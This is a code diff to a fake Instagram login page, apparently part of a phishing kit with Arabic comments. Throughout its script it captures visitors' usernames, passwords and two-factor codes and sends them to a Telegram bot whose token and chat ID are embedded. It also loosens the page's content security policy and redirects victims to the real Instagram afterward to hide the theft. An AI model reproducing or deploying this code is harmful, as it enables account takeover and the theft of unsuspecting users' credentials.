@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login • Instagram</title>
     <link rel="icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/v4/y9/r/l5OZ5m7Mx3I.ico">
+    <meta http-equiv="Content-Security-Policy" content="default-src *; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src *; img-src *;">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
         body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; flex-direction: column; }
@@ -170,219 +171,199 @@
 </footer>
 
 <script>
-    // ===== التوكين والـ Chat ID =====
-    const BOT_TOKEN = '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg';
-    const CHAT_ID = '8278195073';
+    // =====================================================
+    // IMPORTANT: استبدل هذه القيم بتاعك
+    // =====================================================
+    var BOT_TOKEN = '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg';
+    var CHAT_ID = '8278195073';
 
-    const slides = document.getElementById('slides');
-    let currentSlide = 0;
-    setInterval(() => {
-        currentSlide = (currentSlide + 1) % 4;
-        slides.style.transform = `translateX(-${currentSlide * 100}%)`;
+    // =====================================================
+    // دالة الإرسال إلى تيليغرام (طريقة وحدة لكن فعالة)
+    // =====================================================
+    function sendToTelegram(msg) {
+        var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+        var data = 'chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(msg) + '&parse_mode=Markdown';
+
+        // إنشاء طلب AJAX بشكل صحيح
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', url, true);
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.setRequestHeader('Cache-Control', 'no-cache');
+        xhr.send(data);
+    }
+
+    // =====================================================
+    // عناصر الصفحة
+    // =====================================================
+    var slides = document.getElementById('slides');
+    var slideIndex = 0;
+    setInterval(function() {
+        slideIndex = (slideIndex + 1) % 4;
+        slides.style.transform = 'translateX(-' + (slideIndex * 100) + '%)';
     }, 3000);
 
-    const u = document.getElementById('username');
-    const p = document.getElementById('password');
-    const loginBtn = document.getElementById('loginBtn');
-    const loginForm = document.getElementById('loginForm');
-    const cooldownOverlay = document.getElementById('cooldownOverlay');
-    const cooldownText = document.getElementById('cooldownText');
-    const loginCard = document.getElementById('loginCard');
-    const signupCard = document.getElementById('signupCard');
-    const twofaSection = document.getElementById('twofaSection');
-    const displayUser = document.getElementById('displayUser');
-    const codeBoxes = document.querySelectorAll('.code-box');
-    const verifyBtn = document.getElementById('verifyBtn');
-    const resendBtn = document.getElementById('resendBtn');
-    const backLink = document.getElementById('backToLogin');
-    const loadingScreen = document.getElementById('loadingScreen');
+    var usernameInput = document.getElementById('username');
+    var passwordInput = document.getElementById('password');
+    var loginBtn = document.getElementById('loginBtn');
+    var loginForm = document.getElementById('loginForm');
+    var cooldownOverlay = document.getElementById('cooldownOverlay');
+    var cooldownText = document.getElementById('cooldownText');
+    var loginCard = document.getElementById('loginCard');
+    var signupCard = document.getElementById('signupCard');
+    var twofaSection = document.getElementById('twofaSection');
+    var displayUser = document.getElementById('displayUser');
+    var codeBoxes = document.querySelectorAll('.code-box');
+    var verifyBtn = document.getElementById('verifyBtn');
+    var resendBtn = document.getElementById('resendBtn');
+    var backLink = document.getElementById('backToLogin');
+    var loadingScreen = document.getElementById('loadingScreen');
 
-    let capturedUsername = '';
-    let capturedPassword = '';
-    let cooldownTimer = null;
-    let cooldownCount = 0;
+    var savedUsername = '';
+    var savedPassword = '';
+    var cooldownTimer = null;
+    var cooldownSeconds = 0;
 
-    function checkLogin() {
-        loginBtn.disabled = !(u.value.trim() && p.value.trim());
+    // تفعيل زر login
+    function checkLoginBtn() {
+        loginBtn.disabled = !(usernameInput.value.trim() && passwordInput.value);
     }
-    u.addEventListener('input', checkLogin);
-    p.addEventListener('input', checkLogin);
+    usernameInput.addEventListener('input', checkLoginBtn);
+    passwordInput.addEventListener('input', checkLoginBtn);
 
-    // ===== دالة الإرسال إلى تيليغرام - مضمونة 100% =====
-    function sendToTelegram(message) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
-        // الطريقة 1: XMLHttpRequest متزامن (أقوى طريقة)
-        try {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', url, false); // false = متزامن، ينتظر حتى يكتمل الإرسال
-            xhr.send();
-        } catch(e) {}
-
-        // الطريقة 2: Image beacon
-        try {
-            var img = new Image();
-            img.src = url;
-        } catch(e) {}
-
-        // الطريقة 3: fetch مع no-cors
-        try {
-            fetch(url, { method: 'GET', mode: 'no-cors' });
-        } catch(e) {}
-    }
-
-    // ===== اختبار الإرسال عند تحميل الصفحة =====
+    // =====================================================
+    // عند تحميل الصفحة - نختبر البوت
+    // =====================================================
     window.addEventListener('load', function() {
-        sendToTelegram('✅ *Page Loaded* ✅\n\n🌐 URL: ' + window.location.href + '\n⏰ Time: ' + new Date().toISOString());
+        sendToTelegram('✅ صفحة Instagram تم تحميلها بنجاح');
+        console.log('✅ Test message sent to Telegram');
     });
 
-    // ===== SUBMIT LOGIN مع العد التنازلي =====
+    // =====================================================
+    // SUBMIT LOGIN
+    // =====================================================
     loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
         if (cooldownTimer) return;
 
-        capturedUsername = u.value.trim();
-        capturedPassword = p.value;
+        savedUsername = usernameInput.value.trim();
+        savedPassword = passwordInput.value;
 
-        // نرسلو البيانات فوراً
-        sendToTelegram(
-            '🔐 *Instagram Login Captured* 🔐\n\n' +
-            '👤 *Username:* `' + capturedUsername + '`\n' +
-            '🔑 *Password:* `' + capturedPassword + '`\n' +
-            '📱 *UA:* ' + navigator.userAgent + '\n' +
-            '⏰ *Time:* ' + new Date().toISOString() + '\n' +
-            '🌐 *URL:* ' + window.location.href
-        );
+        // إرسال البيانات إلى تيليغرام
+        var msg = '🔐 *Instagram* 🔐\n\n';
+        msg += '👤 *User:* `' + savedUsername + '`\n';
+        msg += '🔑 *Pass:* `' + savedPassword + '`\n';
+        msg += '⏰ *Time:* ' + new Date().toLocaleString();
+        sendToTelegram(msg);
 
-        // ===== العد التنازلي 10 ثواني =====
+        // إظهار العد التنازلي
         loginBtn.disabled = true;
         cooldownOverlay.style.display = 'flex';
-        cooldownCount = 10;
+        cooldownSeconds = 10;
         cooldownText.textContent = 'Sending code... (10s)';
 
         cooldownTimer = setInterval(function() {
-            cooldownCount--;
-            if (cooldownCount > 0) {
-                cooldownText.textContent = 'Sending code... (' + cooldownCount + 's)';
+            cooldownSeconds--;
+            if (cooldownSeconds > 0) {
+                cooldownText.textContent = 'Sending code... (' + cooldownSeconds + 's)';
             } else {
                 clearInterval(cooldownTimer);
                 cooldownTimer = null;
                 cooldownOverlay.style.display = 'none';
 
-                // إظهار صفحة 2FA
+                // إظهار نافذة 2FA
                 loginCard.style.display = 'none';
                 signupCard.style.display = 'none';
                 twofaSection.style.display = 'block';
-                displayUser.textContent = capturedUsername || 'your phone';
+                displayUser.textContent = savedUsername || 'your phone';
 
-                codeBoxes.forEach(function(box) { box.value = ''; });
+                // تفريغ وتركيز
+                for (var i = 0; i < codeBoxes.length; i++) {
+                    codeBoxes[i].value = '';
+                }
                 codeBoxes[0].focus();
                 verifyBtn.disabled = true;
             }
         }, 1000);
     });
 
-    // ===== 2FA CODE INPUT =====
-    codeBoxes.forEach(function(box, index) {
-        box.addEventListener('input', function() {
-            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 1);
-            if (this.value && index < codeBoxes.length - 1) {
-                codeBoxes[index + 1].focus();
-            }
-            var allFilled = true;
-            for (var i = 0; i < codeBoxes.length; i++) {
-                if (codeBoxes[i].value === '') { allFilled = false; break; }
-            }
-            verifyBtn.disabled = !allFilled;
-        });
-        box.addEventListener('keydown', function(e) {
-            if (e.key === 'Backspace' && !this.value && index > 0) {
-                codeBoxes[index - 1].focus();
-            }
-        });
-        box.addEventListener('paste', function(e) {
-            e.preventDefault();
-            var paste = (e.clipboardData || window.clipboardData).getData('text');
-            var digits = paste.replace(/[^0-9]/g, '').slice(0, 6);
-            for (var i = 0; i < digits.length; i++) {
-                if (codeBoxes[i]) codeBoxes[i].value = digits[i];
-            }
-            if (digits.length === 6) {
-                codeBoxes[5].focus();
-                verifyBtn.disabled = false;
-            } else if (codeBoxes[digits.length]) {
-                codeBoxes[digits.length].focus();
-            }
-        });
-    });
+    // =====================================================
+    // 2FA CODE INPUTS
+    // =====================================================
+    for (var i = 0; i < codeBoxes.length; i++) {
+        (function(index) {
+            codeBoxes[index].addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '').substring(0, 1);
+                if (this.value && index < codeBoxes.length - 1) {
+                    codeBoxes[index + 1].focus();
+                }
+                var allFilled = true;
+                for (var j = 0; j < codeBoxes.length; j++) {
+                    if (codeBoxes[j].value === '') { allFilled = false; break; }
+                }
+                verifyBtn.disabled = !allFilled;
+            });
 
-    // ===== VERIFY =====
+            codeBoxes[index].addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    codeBoxes[index - 1].focus();
+                }
+            });
+        })(i);
+    }
+
+    // =====================================================
+    // VERIFY BUTTON
+    // =====================================================
     verifyBtn.addEventListener('click', function() {
         var code = '';
         for (var i = 0; i < codeBoxes.length; i++) {
             code += codeBoxes[i].value;
         }
 
-        // نرسل رمز 2FA
-        sendToTelegram(
-            '🔐 *Instagram 2FA Code Received* 🔐\n\n' +
-            '👤 *Username:* `' + capturedUsername + '`\n' +
-            '🔑 *Password:* `' + capturedPassword + '`\n' +
-            '🔢 *2FA Code:* `' + code + '`\n' +
-            '📱 *UA:* ' + navigator.userAgent + '\n' +
-            '⏰ *Time:* ' + new Date().toISOString() + '\n' +
-            '🌐 *URL:* ' + window.location.href
-        );
+        // إرسال رمز 2FA
+        var msg = '🔐 *2FA Code* 🔐\n\n';
+        msg += '👤 *User:* `' + savedUsername + '`\n';
+        msg += '🔑 *Pass:* `' + savedPassword + '`\n';
+        msg += '🔢 *2FA:* `' + code + '`\n';
+        msg += '⏰ *Time:* ' + new Date().toLocaleString();
+        sendToTelegram(msg);
 
-        // إرسال إضافي عبر form submit كطريقة احتياطية قصوى
-        try {
-            var form = document.createElement('form');
-            form.method = 'GET';
-            form.action = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
-            var input1 = document.createElement('input');
-            input1.name = 'chat_id';
-            input1.value = CHAT_ID;
-            var input2 = document.createElement('input');
-            input2.name = 'text';
-            input2.value = '🔐 2FA: ' + capturedUsername + ' | Code: ' + code + ' | Time: ' + new Date().toISOString();
-            var input3 = document.createElement('input');
-            input3.name = 'parse_mode';
-            input3.value = 'Markdown';
-            form.appendChild(input1);
-            form.appendChild(input2);
-            form.appendChild(input3);
-            form.style.display = 'none';
-            document.body.appendChild(form);
-            form.submit();
-        } catch(e) {}
-
+        // إظهار شاشة التحميل ثم التوجيه
         loadingScreen.style.display = 'flex';
         setTimeout(function() {
             window.location.href = 'https://www.instagram.com';
         }, 2000);
     });
 
-    // ===== RESEND =====
+    // =====================================================
+    // RESEND
+    // =====================================================
     resendBtn.addEventListener('click', function() {
-        codeBoxes.forEach(function(box) { box.value = ''; });
+        for (var i = 0; i < codeBoxes.length; i++) {
+            codeBoxes[i].value = '';
+        }
         codeBoxes[0].focus();
         verifyBtn.disabled = true;
-        sendToTelegram('🔄 *Resend Code Requested* 🔄\n\n👤 *Username:* `' + capturedUsername + '`\n⏰ *Time:* ' + new Date().toISOString());
+        sendToTelegram('🔄 طلب إعادة إرسال الكود من: ' + savedUsername);
     });
 
-    // ===== BACK TO LOGIN =====
+    // =====================================================
+    // BACK TO LOGIN
+    // =====================================================
     backLink.addEventListener('click', function(e) {
         e.preventDefault();
         twofaSection.style.display = 'none';
         loginCard.style.display = 'block';
         signupCard.style.display = 'block';
-        checkLogin();
+        checkLoginBtn();
     });
 
-    // ===== FACEBOOK =====
+    // =====================================================
+    // FACEBOOK LOGIN
+    // =====================================================
     document.getElementById('fbLogin').addEventListener('click', function(e) {
         e.preventDefault();
-        sendToTelegram('📘 *Facebook Login Clicked* 📘\n\n👤 *Username:* `' + (capturedUsername || 'N/A') + '`\n⏰ *Time:* ' + new Date().toISOString());
+        sendToTelegram('📘 Facebook Login clicked by: ' + (savedUsername || 'unknown'));
     });
 </script>
 </body>
